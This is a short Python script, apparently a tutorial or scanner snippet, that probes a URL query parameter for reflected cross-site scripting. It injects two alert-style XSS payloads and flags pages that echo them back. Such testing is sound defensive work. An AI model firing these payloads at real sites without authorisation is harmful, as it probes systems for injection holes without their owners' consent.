import requests

def test_xss(url, parameter):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        # list of your payloads
    ]
    
    for payload in payloads:
        modified_url = f'{url}?{parameter}={payload}'
        response = requests.get(modified_url)
        if payload in response.text:
            print(f'Potential XSS detected here - {modified_url}')

# example
test_xss("https://testwebsite.com/search", "query_param_name")
